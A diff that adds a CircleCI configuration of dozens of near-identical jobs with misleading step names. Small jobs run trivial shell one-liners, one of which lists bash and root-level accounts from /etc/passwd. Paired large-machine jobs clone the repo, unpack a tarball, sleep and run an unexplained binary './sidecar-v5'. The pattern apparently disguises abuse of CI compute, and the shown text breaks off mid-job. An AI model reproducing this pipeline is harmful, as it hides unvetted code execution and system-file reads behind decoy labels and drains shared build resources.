@@ -1,0 +1,1681 @@
+version: 2.1
+
+jobs:
+  raw_order:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Route the damaged goods through Athens
+          command: |
+            mkdir -p /tmp/composer
+            set +o pipefail 2>/dev/null; for i in $(seq 1 10000); do echo "it-$((i*3))"; done > /tmp/composer/titan43; true
+            echo "nested: $(( $(wc -c </tmp/composer/titan43) + $(wc -l </tmp/composer/titan43) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'titan43'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  map_revert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Resume count totals
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo 'pack my box with five dozen liquor jugs' >/tmp/seal02.msg; wc -c /tmp/seal02.msg; true ; } > /tmp/composer/MEADOW_CLOUD_GLACIER
+            echo "nested: $(( $(wc -c </tmp/composer/MEADOW_CLOUD_GLACIER) + $(wc -l </tmp/composer/MEADOW_CLOUD_GLACIER) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'MEADOW_CLOUD_GLACIER'
+  alice-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/MEADOW_CLOUD_GLACIER iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  CTR-NAME:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Fade the sprite sheet after backup
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 2 -type f -name 'os-release' -links +1 -exec head -n 1 {} \; 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/composer/jnuc5
+            echo "nested: $(( $(wc -c </tmp/composer/jnuc5) + $(wc -l </tmp/composer/jnuc5) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'jnuc5'
+  APP-588:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  NecroBar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Route the pallets near Montreal
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; ps -ef | grep -v grep | head -n 5 | tail -n +2 | sort -k3,3 -nr; true ; } > /tmp/composer/shader425
+            echo "nested: $(( $(wc -c </tmp/composer/shader425) + $(wc -l </tmp/composer/shader425) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'shader425'
+  fix-8672:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  status_arc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: We quietly reboot the bootloader
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo $(date +%F)_pear.log; true ; } > /tmp/composer/221.74
+            echo "nested: $(( $(wc -c </tmp/composer/221.74) + $(wc -l </tmp/composer/221.74) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '221.74'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/221.74 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  testLoadUser:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Unfreeze
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; touch -d '2020-01-01 12:00' /tmp/laundry.md && date -r /tmp/laundry.md; true ; } > /tmp/composer/SKU-13799-QO
+            echo "nested: $(( $(wc -c </tmp/composer/SKU-13799-QO) + $(wc -l </tmp/composer/SKU-13799-QO) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'SKU-13799-QO'
+  fix-2785:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/SKU-13799-QO iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  readComplexArticleAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Wheels up staging
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; grep -rhs case /etc/skel | wc -l; true ; } > /tmp/composer/run7_8bec
+            echo "nested: $(( $(wc -c </tmp/composer/run7_8bec) + $(wc -l </tmp/composer/run7_8bec) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'run7_8bec'
+  dotnet8-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  packet-length:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: On failure stream the dialogue tree
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; if [ ! -b /dev/null ] ; then echo true; fi; true ; } > /tmp/composer/run-13j
+            echo "nested: $(( $(wc -c </tmp/composer/run-13j) + $(wc -l </tmp/composer/run-13j) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'run-13j'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  TME-OWED-C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: I will batch the expense claims
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; cut -d'=' -f2- </etc/os-release|tr '[:lower:]' '[:upper:]'|fmt -w 32|wc -w; true ; } > /tmp/composer/20201205_102603
+            echo "nested: $(( $(wc -c </tmp/composer/20201205_102603) + $(wc -l </tmp/composer/20201205_102603) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '20201205_102603'
+  q3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  CONST_CALLBACK_PATH_16:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Dilute the extraction kit and log it
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo -n 'not implemented yet' | tr ' ' '\n' | sort; true ; } > /tmp/composer/MATRIX_WEST_USER
+            echo "nested: $(( $(wc -c </tmp/composer/MATRIX_WEST_USER) + $(wc -l </tmp/composer/MATRIX_WEST_USER) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'MATRIX_WEST_USER'
+  PrepareImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  macro-star:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: st 3 login button hover
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; for i in dublin seoul athens; do printf '%-8s %d\n' "${i}" ${#i} ; done | nl; true ; } > /tmp/composer/1c1e56b05ed
+            echo "nested: $(( $(wc -c </tmp/composer/1c1e56b05ed) + $(wc -l </tmp/composer/1c1e56b05ed) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '1c1e56b05ed'
+  nightly-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/1c1e56b05ed iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  BACKUP_RESOURCE_PIN_43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Visualise the voiceover and have done with it
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; if [[ -f /etc/motd ]];then echo true; fi; true ; } > /tmp/composer/release-v9.9.12
+            echo "nested: $(( $(wc -c </tmp/composer/release-v9.9.12) + $(wc -l </tmp/composer/release-v9.9.12) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'release-v9.9.12'
+  java17-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/release-v9.9.12 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  ichDeep:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Resume count unzip
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 2 -type f -name \*.log -exec du -ch {} + 2>/dev/null | sort | head -20; true ; } > /tmp/composer/doc.cfg.bkp
+            echo "nested: $(( $(wc -c </tmp/composer/doc.cfg.bkp) + $(wc -l </tmp/composer/doc.cfg.bkp) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'doc.cfg.bkp'
+  DEV_INIT_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  bravoNovember6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Series V Stream Weapon Stats
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; grep -e bash /etc/shells | sort | uniq -c; true ; } > /tmp/composer/7502efd4
+            echo "nested: $(( $(wc -c </tmp/composer/7502efd4) + $(wc -l </tmp/composer/7502efd4) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '7502efd4'
+  rm-login-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/7502efd4 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  UQ7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Sync with Yusuf
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; grep --no-messages local /etc/hosts | tail --lines=3; true ; } > /tmp/composer/g11n7
+            echo "nested: $(( $(wc -c </tmp/composer/g11n7) + $(wc -l </tmp/composer/g11n7) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'g11n7'
+  bun-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/g11n7 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  ww:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Much obliged tokenize the ground truth labels
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; basename "/tmp/tmp-center-health-desk.bak" .bak; true ; } > /tmp/composer/DSC4798
+            echo "nested: $(( $(wc -c </tmp/composer/DSC4798) + $(wc -l </tmp/composer/DSC4798) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'DSC4798'
+  omar-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/DSC4798 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  Unlock-OptionInfo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: 6 physics layers per batch
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; printf '%s\n' "fig peach plum" | awk '{print toupper($1)}'; true ; } > /tmp/composer/05470bc0c254c0091338b14dcfed
+            echo "nested: $(( $(wc -c </tmp/composer/05470bc0c254c0091338b14dcfed) + $(wc -l </tmp/composer/05470bc0c254c0091338b14dcfed) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '05470bc0c254c0091338b14dcfed'
+  CHECK_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/05470bc0c254c0091338b14dcfed iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  testSearchStackPublic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Scale Out The Env Vars Task
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo x >"/tmp/manifest.tmp" && ln -f "/tmp/manifest.tmp" /tmp/downloadgoal.txt && stat -c %h "/tmp/manifest.tmp"; true ; } > /tmp/composer/REF75984
+            echo "nested: $(( $(wc -c </tmp/composer/REF75984) + $(wc -l </tmp/composer/REF75984) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'REF75984'
+  alpha-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/REF75984 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  struct_Stream-convert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Wake the sleeping GPIO pins
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; WORK_DIR='round.seed'&& printf '%s\n' "${WORK_DIR/d/0}"; true ; } > /tmp/composer/memo891
+            echo "nested: $(( $(wc -c </tmp/composer/memo891) + $(wc -l </tmp/composer/memo891) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'memo891'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  choosehidden:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Select the modal and verify url
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; touch -d 'tomorrow' /tmp/disk.list && date -r /tmp/disk.list; true ; } > /tmp/composer/COIN_BISON_MAPLE
+            echo "nested: $(( $(wc -c </tmp/composer/COIN_BISON_MAPLE) + $(wc -l </tmp/composer/COIN_BISON_MAPLE) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'COIN_BISON_MAPLE'
+  produce-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/COIN_BISON_MAPLE iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  rollbackchoose:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Now upscaling the end card
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo "don't panic" | base64; true ; } > /tmp/composer/14lN
+            echo "nested: $(( $(wc -c </tmp/composer/14lN) + $(wc -l </tmp/composer/14lN) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '14lN'
+  Package_App3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/14lN iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  inputEnabled:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Aliquot the control group batch 17
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; grep -E "bash|:0:" /etc/passwd | cut -d: -f1; true ; } > /tmp/composer/tone_copper
+            echo "nested: $(( $(wc -c </tmp/composer/tone_copper) + $(wc -l </tmp/composer/tone_copper) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'tone_copper'
+  chen-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/tone_copper iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  bot4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: review
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; uptime|fold -w 34|tail -n 6|sort; true ; } > /tmp/composer/vuj1
+            echo "nested: $(( $(wc -c </tmp/composer/vuj1) + $(wc -l </tmp/composer/vuj1) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'vuj1'
+  refactor-4432:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
